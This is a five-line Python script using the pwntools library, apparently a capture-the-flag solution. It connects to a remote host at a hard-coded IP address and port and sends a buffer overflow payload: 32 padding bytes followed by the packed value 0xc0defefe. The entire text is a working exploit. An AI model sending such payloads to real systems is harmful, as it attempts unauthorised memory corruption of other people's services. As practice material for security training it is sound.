from pwn import *

io = remote("89.38.210.128", 31338)
io.send("A"*32+p32(0xc0defefe))
io.recvline()
